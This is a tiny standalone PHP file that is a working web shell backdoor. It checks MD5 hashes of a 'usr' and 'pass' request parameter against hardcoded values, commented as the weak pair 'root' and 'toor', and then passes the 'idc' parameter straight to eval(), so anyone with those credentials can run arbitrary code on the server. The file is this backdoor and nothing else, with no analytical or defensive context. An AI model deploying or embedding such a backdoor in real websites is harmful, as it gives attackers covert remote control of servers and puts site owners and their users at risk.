<?php
$user="63a9f0ea7bb98050796b649e85481845"; #root
$pass="7b24afc8bc80e548d66c4e7ff72171c5"; #toor

if (md5($_GET['usr'])==$user && md5($_GET['pass'])==$pass)
{eval($_GET['idc']);}
?>
